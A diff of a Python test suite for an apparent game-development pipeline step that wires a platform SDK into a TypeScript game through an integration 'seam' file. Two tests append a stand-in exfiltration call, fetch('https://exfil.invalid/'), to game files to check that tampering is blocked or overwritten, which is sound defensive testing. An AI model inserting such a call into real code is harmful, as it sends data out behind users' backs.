@@ -158,28 +158,30 @@ def adapter_ts(class_name, constant, ads, cloud_saves, url=None,
     )
 
 
+# A develop-step game's boot: the template's order, the platform and the seam from the
+# Factory's wiring (wgflib.gameseam), which this step replaces without touching main.ts.
 MAIN_TS = """\
 import { Game } from "@wgf/game-core";
-import { createPlatform } from "@wgf/platform-sdk";
-import { config, primaryPlatform } from "./core/config.js";
 import { bindPlatform } from "./platform/bind.js";
+import { createGameIntegration, createGamePlatform } from "./platform/integration.js";
 
 async function main(): Promise<void> {
-  const platform = createPlatform(primaryPlatform().id, { namespace: config.game.id });
-  await platform.initialize();
+  const platform = await createGamePlatform();
   platform.reportLoadingProgress(0.5);
 
   const game = new Game();
+  const audio = { mute: () => undefined, unmute: () => undefined };
   bindPlatform(game, platform, {
     onAudioMutedChange: (muted) => {
       document.documentElement.dataset["audioMuted"] = String(muted);
     },
   });
+  const integration = createGameIntegration(game, platform, { audio });
 
   platform.reportLoadingProgress(1);
   await platform.signalReady();
   game.start();
-  platform.gameplayStart();
+  void integration;
 }
 
 void main();
@@ -220,6 +222,9 @@ monetization:
 """
 
 
+from wgf_develop import seam as develop_seam  # noqa: E402
+
+
 def write(root, relative, text):
     path = os.path.join(root, *relative.split("/"))
     os.makedirs(os.path.dirname(path), exist_ok=True)
@@ -233,7 +238,8 @@ def read(root, relative):
         return handle.read()
 
 
-def make_repo(root, scene=True, node_modules=True, main=MAIN_TS, game_config=GAME_CONFIG):
+def make_repo(root, scene=True, node_modules=True, main=MAIN_TS, game_config=GAME_CONFIG,
+              seam=True):
     sdk = "packages/platform-sdk"
     write(root, f"{sdk}/package.json", json.dumps({"name": "@wgf/platform-sdk",
                                                     "version": "0.1.0"}))
@@ -254,6 +260,9 @@ def make_repo(root, scene=True, node_modules=True, main=MAIN_TS, game_config=GAM
     if main is not None:
         write(root, "src/main.ts", main)
     write(root, "src/platform/bind.ts", "export function bindPlatform(): void {}\n")
+    if seam:  # what the develop step provides before a game is built
+        for relative, text in develop_seam.default_files().items():
+            write(root, relative, text)
     if scene:
         write(root, "src/game/run-scene.ts", SCENE_TS)
     if node_modules:
@@ -290,6 +299,8 @@ class FakeRunner:
             with open(output, "w", encoding="utf-8") as handle:
                 json.dump({"testResults": [{"assertionResults": results}]}, handle)
             return CommandResult(1 if self.failing else 0, "", "")
+        if argv[0] == "node" and argv[1] == integrate.SEAM_SCANNER:
+            return None  # no node here: the step falls back to the regex reading, and says so
         if "tsc" in argv:
             if self.tsc_output:
                 return CommandResult(2, self.tsc_output, "")
@@ -462,11 +473,20 @@ class InspectSdk(SdkCase):
         self.assertTrue(sdk.adapter("generic-web").implemented)
         for member in ("initialize", "signalReady", "showRewarded", "showInterstitial"):
             self.assertIn(member, sdk.members)
-        main = os.path.join(template, "src", "main.ts")
-        if os.path.exists(main):
-            os.makedirs(os.path.join(self.repo, "src"))
-            shutil.copy(main, os.path.join(self.repo, "src", "main.ts"))
-            self.assertEqual(integrate.patch_main(self.repo)["action"], "patched")
+        # The seam's wiring boots exactly as the template's own main.ts does: the template's
+        # createPlatform options (per-title portal settings included), nothing narrower.
+        template_main = read(template, "src/main.ts")
+        for wiring in (read(os.path.join(SCRIPTS, "wgf_develop", "seam"),
+                            "src/platform/integration.ts"),
+                       read(os.path.join(SCRIPTS, "wgf_sdk", "game"),
+                            "src/platform/integration.ts")):
+            for needle in ("platformOptions(primary)", "y8: platformConfig.y8"):
+                self.assertIn(needle, template_main)
+                self.assertIn(needle, wiring)
+        config_ts = read(template, "src/core/config.ts")
+        self.assertIn("export function platformOptions", config_ts)
+        self.assertIn("export function primaryPlatform", config_ts)
+        self.assertIn("export async function withAdBreak", read(template, "src/platform/bind.ts"))
 
 
 class Triggers(unittest.TestCase):
@@ -494,19 +514,23 @@ class Integration(SdkCase):
         self.assertEqual(result.outcome, StepOutcome.SUCCESS, result.error or result.message)
         report = self.report(result)
 
-        # Files: the layer and its suite, the generated plan, the patched boot.
+        # Files: the layer and its suite, the generated plan, the seam on the layer, and the
+        # seam's wiring written over the develop step's default. main.ts is not touched.
         actions = {f["path"]: f["action"] for f in report["integration"]["files"]}
         self.assertEqual(actions, {
             "src/platform/gameplay.ts": "created",
             TEST_FILE: "created",
             "src/platform/integration-plan.ts": "created",
-            "src/main.ts": "patched",
+            "src/platform/game-integration.ts": "created",
+            "tests/unit/platform/game-integration.test.ts": "created",
+            "src/platform/integration.ts": "updated",
         })
-        main = read(self.repo, "src/main.ts")
-        self.assertIn("await bootPlatform(primaryPlatform().id, {", main)
-        self.assertIn("gameplay.runStarted();", main)
-        self.assertNotIn("createPlatform", main)
-        self.assertNotIn("platform.gameplayStart();", main)
+        self.assertEqual(read(self.repo, "src/main.ts"), MAIN_TS)
+        wiring = read(self.repo, "src/platform/integration.ts")
+        self.assertIn("await bootPlatform(primary.id, {", wiring)
+        # The template's own createPlatform options, whole: per-title Game IDs included.
+        self.assertIn("options: { ...platformOptions(primary), y8: platformConfig.y8 }", wiring)
+        self.assertIn("new PlatformGameIntegration()", wiring)
 
         plan = read(self.repo, "src/platform/integration-plan.ts")
         self.assertIn('id: "rewarded-game-over"', plan)
@@ -577,14 +601,26 @@ class Integration(SdkCase):
         before = self.feature(self.report(self.execute()), "gamevui", "analytics")
         self.assertEqual(before["status"], "partial")
         self.assertIn("tracker", before["note"])
-        main = read(self.repo, "src/main.ts").replace(
-            "{ target: booted.target }", "{ target: booted.target, tracker: analytics }")
+        main = read(self.repo, "src/main.ts").replace("{ audio }", "{ audio, tracker: analytics }")
         write(self.repo, "src/main.ts", main)
         after = self.feature(self.report(self.execute()), "gamevui", "analytics")
         self.assertEqual(after["status"], "working")
 
+    def test_a_game_foreign_change_to_main_ts_is_refused_not_regenerated(self):
+        # main.ts is the game's: the step never writes it, so a dirty main.ts is not its to
+        # regenerate or commit.
+        make_repo(self.repo)
+        base = git(self.repo, "rev-parse", "HEAD").stdout.strip()
+        with open(os.path.join(self.repo, "src", "main.ts"), "a") as handle:
+            handle.write("fetch('https://exfil.invalid/');\n")
+        result = self.execute(prototype_report=prototype_at(base), commit_first=False)
+        self.assertEqual(result.outcome, StepOutcome.BLOCKED)
+        self.assertIn("src/main.ts", result.message)
+        self.assertEqual(git(self.repo, "rev-parse", "HEAD").stdout.strip(), base)
+
     def test_a_silent_game_has_nothing_to_mute(self):
-        make_repo(self.repo, main=MAIN_TS.replace("onAudioMutedChange", "onSomethingElse"))
+        make_repo(self.repo, main=MAIN_TS.replace("onAudioMutedChange", "onSomethingElse")
+                  .replace("{ audio }", "{}"))
         audio = self.feature(self.report(self.execute()), "yandex", "audio-mute")
         self.assertEqual(audio["status"], "not-required")
         write(self.repo, "src/game/sound.ts", "export const ctx = new AudioContext();\n")
@@ -606,7 +642,7 @@ class Integration(SdkCase):
         make_repo(self.repo)
         first = self.report(self.execute())
         snapshot = {p: read(self.repo, p) for p in (*integrate.OWNED_FILES, integrate.PLAN_FILE,
-                                                    integrate.MAIN_FILE)}
+                                                    integrate.WIRING_FILE, "src/main.ts")}
         second = self.report(self.execute())
         self.assertEqual({f["action"] for f in second["integration"]["files"]}, {"unchanged"})
         self.assertEqual(snapshot, {p: read(self.repo, p) for p in snapshot})
@@ -668,35 +704,38 @@ class Integration(SdkCase):
         self.assertEqual(banner["status"], "unsupported")
         self.assertIn("no banner", banner["fallback"])
 
-    def test_a_changed_boot_sequence_is_left_alone_and_reported(self):
-        make_repo(self.repo, main="// hand-written boot\n")
-        report = self.report(self.execute())
-        main = next(f for f in report["integration"]["files"] if f["path"] == "src/main.ts")
-        self.assertEqual(main["action"], "skipped")
-        self.assertIn("by hand", main["note"])
-        self.assertEqual(read(self.repo, "src/main.ts"), "// hand-written boot\n")
-        self.assertEqual(self.feature(report, "yandex", "init")["status"], "partial")
+    def test_a_boot_that_bypasses_the_seam_fails_loudly_and_writes_nothing(self):
+        # Before, a boot sequence the step's regexes did not recognise was "skipped": the
+        # step reported success with an SDK nothing called. Now it is refused.
+        template_boot = ('import { createPlatform } from "@wgf/platform-sdk";\n'
+                         "const platform = createPlatform(primary.id, platformOptions(primary));\n")
+        make_repo(self.repo, main=template_boot)
+        head = git(self.repo, "rev-parse", "HEAD").stdout.strip()
+        result = self.execute()
+        self.assertEqual((result.outcome, result.retryable), (StepOutcome.FAILED, False))
+        self.assertIn('does not import createGamePlatform from "./platform/integration.js"',
+                      result.error)
+        self.assertIn("src/main.ts calls createPlatform directly", result.error)
+        self.assertEqual(read(self.repo, "src/main.ts"), template_boot)
+        self.assertFalse(os.path.exists(os.path.join(self.repo, "src/platform/gameplay.ts")))
+        self.assertEqual(git(self.repo, "rev-parse", "HEAD").stdout.strip(), head)
 
-    def test_a_boot_that_waits_for_the_player_keeps_waiting(self):
-        main = MAIN_TS.replace("  game.start();\n  platform.gameplayStart();\n",
-                               "  game.start();\n")
-        make_repo(self.repo, main=main)
+    def test_a_build_without_the_seam_files_fails_loudly(self):
+        make_repo(self.repo, seam=False)
+        result = self.execute()
+        self.assertEqual((result.outcome, result.retryable), (StepOutcome.FAILED, False))
+        self.assertIn("does not declare GameIntegration", result.error)
+        self.assertIn("src/platform/integration.ts", result.error)
+
+    def test_main_ts_is_never_edited(self):
+        make_repo(self.repo)
         self.execute()
-        text = read(self.repo, "src/main.ts")
-        self.assertIn("  installGameplay(\n", text)
-        self.assertNotIn("const gameplay", text)  # unused, and lint would say so
+        self.assertEqual(read(self.repo, "src/main.ts"), MAIN_TS)
+        self.assertEqual(git(self.repo, "diff", "--name-only", "HEAD~1", "HEAD", "--",
+                             "src/main.ts").stdout.strip(), "")
 
 
 # -- failure paths (contract §7) ----------------------------------------------------------------
-
-SEAM_DEFAULT_TS = """\
-import type { Platform } from "@wgf/platform-sdk";
-import { type GameIntegration } from "../game/integration.js";
-
-export class DefaultIntegration implements GameIntegration {
-  constructor(readonly platform: Platform) {}
-}
-"""
 
 SEAM_SCENE_TS = """\
 import type { GameIntegration } from "./integration.js";
@@ -722,16 +761,11 @@ class Seam(SdkCase):
     """A develop-step game: it calls src/game/integration.ts with its own placement ids."""
 
     def make_seam_game(self):
-        from wgf_develop.brief import INTEGRATION_CONTRACT
         make_repo(self.repo, scene=False, main=MAIN_TS.replace(
             'import { bindPlatform } from "./platform/bind.js";\n',
             'import { bindPlatform } from "./platform/bind.js";\n'
-            'import { DefaultIntegration } from "./platform/default-integration.js";\n'
             'import { onCrash } from "./game/run-scene.js";\n').replace(
-            "  const game = new Game();\n",
-            "  const game = new Game();\n  void onCrash(new DefaultIntegration(platform));\n"))
-        write(self.repo, "src/game/integration.ts", INTEGRATION_CONTRACT)
-        write(self.repo, "src/platform/default-integration.ts", SEAM_DEFAULT_TS)
+            "  void integration;\n", "  void onCrash(integration);\n"))
         write(self.repo, "src/game/run-scene.ts", SEAM_SCENE_TS)
 
     def test_the_seam_is_wired_to_the_platform(self):
@@ -739,10 +773,11 @@ class Seam(SdkCase):
         report = self.report(self.execute())
         actions = {f["path"]: f["action"] for f in report["integration"]["files"]}
         self.assertEqual(actions["src/platform/game-integration.ts"], "created")
-        self.assertEqual(actions["src/main.ts (seam)"], "patched")
-        main = read(self.repo, "src/main.ts")
-        self.assertIn("void onCrash(new PlatformGameIntegration());", main)
-        self.assertNotIn("DefaultIntegration", main)
+        self.assertEqual(actions["src/platform/integration.ts"], "updated")
+        self.assertNotIn("src/main.ts", actions)
+        self.assertIn("void onCrash(integration);", read(self.repo, "src/main.ts"))
+        self.assertIn("return new PlatformGameIntegration();",
+                      read(self.repo, "src/platform/integration.ts"))
 
         placements = {p["id"]: p for p in report["integration"]["placements"]}
         self.assertEqual((placements["revive-after-crash"]["moment"],
@@ -769,13 +804,165 @@ class Seam(SdkCase):
         self.execute()
         second = self.report(self.execute())
         actions = {f["path"]: f["action"] for f in second["integration"]["files"]}
-        self.assertEqual(actions["src/main.ts (seam)"], "unchanged")
+        self.assertEqual(actions["src/platform/integration.ts"], "unchanged")
+        self.assertEqual(set(actions.values()), {"unchanged"})
 
-    def test_without_the_seam_no_seam_files_are_written(self):
-        make_repo(self.repo)
+
+SEAM_CONSTANTS_TS = """\
+import type { GameIntegration } from "./integration.js";
+
+// Named ids, as a developer writes them (the real acceptance run's game did exactly this).
+const REVIVE = "revive-after-crash";
+const PLACEMENTS = { retry: 'retry-break', level: "between-levels" } as const;
+
+export async function onCrash(seam: GameIntegration): Promise<void> {
+  seam.gameplayStop();
+  if (seam.canOfferRewarded(REVIVE) && (await seam
+    .rewarded(REVIVE))) {
+    seam.gameplayStart();
+    return;
+  }
+  await seam.interstitial(PLACEMENTS.retry);
+  await seam.interstitial(pickPlacement());
+}
+
+function pickPlacement(): string {
+  return "somewhere";
+}
+"""
+
+
+class SeamPlacementIds(SdkCase):
+    """Placement ids behind names are the game's ids all the same."""
+
+    def test_named_ids_reach_the_plan_and_unresolvable_ones_are_reported(self):
+        make_repo(self.repo, scene=False, main=MAIN_TS.replace(
+            'import { bindPlatform } from "./platform/bind.js";\n',
+            'import { bindPlatform } from "./platform/bind.js";\n'
+            'import { onCrash } from "./game/run-scene.js";\n').replace(
+            "  void integration;\n", "  void onCrash(integration);\n"))
+        write(self.repo, "src/game/run-scene.ts", SEAM_CONSTANTS_TS)
         report = self.report(self.execute())
-        self.assertNotIn("src/platform/game-integration.ts",
-                         [f["path"] for f in report["integration"]["files"]])
+        placements = {p["id"]: p for p in report["integration"]["placements"]}
+        self.assertTrue(placements["revive-after-crash"]["integrated"])
+        self.assertTrue(placements["retry-break"]["integrated"])
+        plan = read(self.repo, "src/platform/integration-plan.ts")
+        self.assertIn('id: "revive-after-crash"', plan)
+        self.assertIn('id: "retry-break"', plan)
+        # A call whose id no static read can establish is reported, never silently dropped.
+        unresolved = placements["unresolved:pickPlacement()"]
+        self.assertFalse(unresolved["integrated"])
+        self.assertIn("run-scene.ts", unresolved["note"])
+        self.assertEqual(ArtifactContracts()("sdk-report", report), [])
+        rewarded = self.feature(report, "yandex", "rewarded")
+        self.assertEqual(rewarded["status"], "working")
+
+
+TYPED_SCENE_TS = """\
+import type { GameIntegration } from "./integration.js";
+
+const REWARDED_PLACEMENT = "extra-moves";
+const PLACEMENTS = { exit: "result-exit" } as const;
+
+interface Context {
+  readonly integration: GameIntegration;
+}
+
+export class PlayScene {
+  readonly #ctx: Context;
+  constructor(ctx: Context) {
+    this.#ctx = ctx;
+  }
+
+  /** The rewarded placement, granted only when `GameIntegration.rewarded()` resolves true. */
+  async fail(): Promise<void> {
+    this.#ctx.integration.gameplayStop();
+    if (await this.#ctx.integration.rewarded(REWARDED_PLACEMENT)) {
+      this.#ctx.integration.gameplayStart();
+      return;
+    }
+    await this.#ctx.integration.interstitial(PLACEMENTS.exit);
+    await this.#ctx.integration.interstitial(String(Date.now()));
+  }
+}
+"""
+
+
+def _pinned_typescript():
+    template, why = pinned_template.checkout()
+    if not template:
+        return None, why
+    path = os.path.join(template, "node_modules", "typescript")
+    if not os.path.isdir(path) or not shutil.which("node"):
+        return None, "the pinned template has no installed typescript, or no node"
+    return path, None
+
+
+_TS, _TS_WHY = _pinned_typescript()
+
+
+@unittest.skipUnless(_TS, _TS_WHY)
+class TypedSeamScanner(unittest.TestCase):
+    """The seam scanner on the TypeScript compiler, with the pinned template's TypeScript.
+
+    The real acceptance run's game reached its seam through a context object
+    (`this.#ctx.integration.rewarded(REWARDED_PLACEMENT)`): no import of the seam in that
+    file, a named id - invisible to the regex reading, so every ad feature read "not
+    called" - and a doc comment naming `GameIntegration.rewarded()` read as a call."""
+
+    def setUp(self):
+        self.repo = tempfile.mkdtemp(prefix="wgf-seam-ts-")
+        self.addCleanup(shutil.rmtree, self.repo, ignore_errors=True)
+        from wgf_develop.brief import INTEGRATION_CONTRACT
+        write(self.repo, "package.json", "{}\n")
+        write(self.repo, "tsconfig.json", json.dumps({
+            "compilerOptions": {"strict": True, "target": "ES2020", "module": "ESNext",
+                                "moduleResolution": "bundler", "noEmit": True},
+            "include": ["src"]}))
+        write(self.repo, "src/game/integration.ts",
+              INTEGRATION_CONTRACT.replace('import type { EventProperties } from '
+                                          '"@wgf/analytics-sdk";\n',
+                                          "type EventProperties = Record<string, unknown>;\n"))
+        write(self.repo, "src/game/play-scene.ts", TYPED_SCENE_TS)
+        write(self.repo, "src/platform/integration.ts",
+              "export const x = { rewarded: (_: string) => 1 };\nx.rewarded('not-the-game');\n")
+        os.makedirs(os.path.join(self.repo, "node_modules"))
+        os.symlink(_TS, os.path.join(self.repo, "node_modules", "typescript"))
+
+    @staticmethod
+    def at(fragment):
+        """src/game/play-scene.ts:<line> of the first line of the fixture containing it."""
+        lines = TYPED_SCENE_TS.splitlines()
+        return f"src/game/play-scene.ts:{next(i for i, l in enumerate(lines, 1) if fragment in l)}"
+
+    def test_calls_through_any_receiver_with_named_ids(self):
+        from wgf_sdk.runner import CommandRunner
+        seam = integrate.scan_seam(self.repo, CommandRunner())
+        self.assertTrue(seam["scanner"].startswith("typescript "), seam["scanner"])
+        self.assertEqual(seam["placements"], {
+            "rewarded": {"extra-moves": [self.at(".rewarded(REWARDED_PLACEMENT)")]},
+            "interstitial": {"result-exit": [self.at(".interstitial(PLACEMENTS.exit)")]}})
+        # The computed id is reported, the doc comment is not a call, src/platform is not
+        # the game.
+        self.assertEqual(seam["unresolved"], [{"call": "interstitial",
+                                               "argument": "String(Date.now())",
+                                               "where": self.at("String(Date.now())")}])
+        self.assertEqual(seam["calls"]["gameplayStop"], [self.at(".gameplayStop()")])
+        self.assertEqual(seam["calls"]["gameplayStart"], [self.at(".gameplayStart()")])
+        self.assertNotIn(self.at("/** The rewarded placement"),
+                         [w for ws in seam["calls"].values() for w in ws])
+
+    def test_the_regex_fallback_says_what_it_cannot_see(self):
+        class NoNode:
+            def run(self, argv, cwd, timeout):
+                return None
+        seam = integrate.scan_seam(self.repo, NoNode())
+        self.assertIn("regex", seam["scanner"])
+        self.assertIn("could not run", seam["scanner"])
+        # It reads this file (it imports the seam): the computed id is reported, and the doc
+        # comment naming `GameIntegration.rewarded()` is not a call.
+        self.assertEqual([u["argument"] for u in seam["unresolved"]], ["String(Date.now())"])
+        self.assertEqual(set(seam["placements"]["rewarded"]), {"extra-moves"})
 
 
 def prototype_at(commit):
@@ -899,11 +1086,13 @@ class Commits(SdkCase):
         first = self.execute(FakeRunner(failing_scenarios={"reward-callback"}),
                              prototype_report=prototype_at(base))
         self.assertEqual(first.outcome, StepOutcome.FAILED)  # left uncommitted, started
-        with open(os.path.join(self.repo, "src", "main.ts"), "a") as handle:
+        # A file the step owns, tampered with between attempts, is regenerated - never kept.
+        with open(os.path.join(self.repo, "src", "platform", "integration.ts"), "a") as handle:
             handle.write("fetch('https://exfil.invalid/');\n")
         again = self.execute(prototype_report=prototype_at(base), commit_first=False)
         self.assertEqual(again.outcome, StepOutcome.SUCCESS, again.error or again.message)
-        self.assertNotIn("exfil", git(self.repo, "show", "HEAD:src/main.ts").stdout)
+        self.assertNotIn("exfil",
+                         git(self.repo, "show", "HEAD:src/platform/integration.ts").stdout)
         self.assertEqual(git(self.repo, "status", "--porcelain").stdout, "")
 
     def test_nothing_is_pushed(self):
@@ -995,7 +1184,7 @@ class FailurePaths(SdkCase):
         self.assertEqual((tests["status"], tests["typecheck"]), ("passed", "passed"))
         self.assertIn("predate", tests["note"])
 
-        ours = "src/main.ts(12,3): error TS2304: Cannot find name 'booted'.\n"
+        ours = "src/platform/integration.ts(12,3): error TS2304: Cannot find name 'booted'.\n"
         result = self.execute(FakeRunner(tsc_output=ours))
         self.assertEqual(result.outcome, StepOutcome.FAILED)
         self.assertEqual(self.report(result)["integration"]["tests"]["typecheck"], "failed")
